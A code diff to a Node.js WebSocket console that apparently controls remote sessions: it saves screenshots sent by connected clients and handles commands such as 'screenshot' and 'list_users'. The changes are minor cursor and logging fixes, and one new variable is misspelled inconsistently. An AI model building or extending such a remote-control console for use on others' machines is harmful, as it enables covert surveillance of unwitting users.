@@ -10,6 +10,7 @@ var workingDir = "";
 process.stdin.setRawMode(true);
 process.stdin.resume();
 cmdHistory = [""];
+var commandLenght = 0;
 sessions = [];
 currentSession = 0;
 const wss = new WebSocket.Server({
@@ -32,6 +33,7 @@ wss.on('connection', function connection(ws) {
 			require("fs").writeFile("screenshots/" + Date.now() + ".png", base64Data, 'base64', function (err) {});
 		} else {
 			console.log(message.grey);
+			console.log();
 		}
 	});
 	ws.on('close', function (reasonCode, description) {
@@ -72,7 +74,7 @@ process.stdin.on("keypress", function (ch, key) {
 		}}catch(e){}
 	} else if (key && key.name == "right") {
 		try{
-		if (cursorPos + 1 < cmdHistory[cmdHistory.length - pos].length - 1) {
+		if (cursorPos < cmdHistory[cmdHistory.length - pos].length - 1) {
 			cursorPos = cursorPos + 1;
 			var before = cmdHistory[cmdHistory.length - pos].slice(0, cursorPos);
 			var cc = cmdHistory[cmdHistory.length - pos][cursorPos];
@@ -118,6 +120,7 @@ process.stdin.on("keypress", function (ch, key) {
 		process.stdout.clearLine();
 		process.stdout.cursorTo(0);
 		process.stdout.write(workingDir.bold.white + "> ".white + cmdHistory[cmdHistory.length - pos] + "\n");
+		commandLength = cmdHistory[cmdHistory.length - pos].length;
 		if (cmdHistory[cmdHistory.length - 1] == "screenshot") {
 			console.log("[".white + "+".blue + "]".white + "Uploading screenshot (May exceed 10MO, please be patient)...".bold);
 		}else if(cmdHistory[cmdHistory.length - 1] == "list_users"){
